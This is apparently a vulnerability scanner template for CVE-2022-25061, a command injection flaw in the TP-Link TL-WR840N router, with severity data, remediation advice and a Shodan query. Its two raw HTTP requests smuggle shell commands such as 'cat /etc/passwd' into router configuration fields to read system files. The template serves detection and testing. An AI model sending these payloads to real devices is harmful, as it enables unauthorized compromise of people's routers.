id: CVE-2022-25061

info:
  name: TP-Link TL-WR840N - Command Injection
  author: ritikchaddha
  severity: critical
  description: |
    The TP-Link TL-WR840N(ES)_V6.20_180709 router contains a command injection vulnerability in the oal_setIp6DefaultRoute component. This vulnerability allows authenticated attackers to execute arbitrary system commands, leading to complete device compromise.
  remediation: |
    Update firmware to the latest version if available. If no firmware update is available,consider implementing network segmentation to limit access to the router's management interface.
  reference:
    - https://github.com/exploitwritter/CVE-2022-25061/blob/main/CVE-2022-25061.py
    - https://east-trowel-102.notion.site/CVE-2021-XXXX-Injection-of-commands-through-object-oal_setIp6DefaultRoute-EN-ddf9c1db199d49829269147ada6cb312
    - https://nvd.nist.gov/vuln/detail/CVE-2022-25061
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.2
    cve-id: CVE-2022-25061
    cwe-id: CWE-78
  metadata:
    max-request: 2
    shodan-query: 'title:"TL-WR840N"'
  tags: cve,cve2022,tplink,router,rce,iot,authenticated

http:
  - raw:
      - |
        POST /cgi?2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Authorization: Basic {{base64(username + ':' + password)}}
        Referer: http://{{Hostname}}/mainFrame.htm

        [NOIP_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,5
        enable=1
        userName=;cat /etc/passwd > /tmp/cmd.txt;
        password=;cat /proc/cpuinfo >> /tmp/cmd.txt;
        userDomain=;cat /tmp/cmd.txt;
        login=1

      - |
        POST /cgi?2 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Authorization: Basic {{base64(username + ':' + password)}}
        Referer: http://{{Hostname}}/mainFrame.htm

        [L3_IP6_FORWARDING#0,0,0,0,0,0#0,0,0,0,0,0]0,3
        __ifAliasName=ewan_ipoev6_d
        __ifName=;cat /tmp/cmd.txt;
        defaultConnectionService=

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
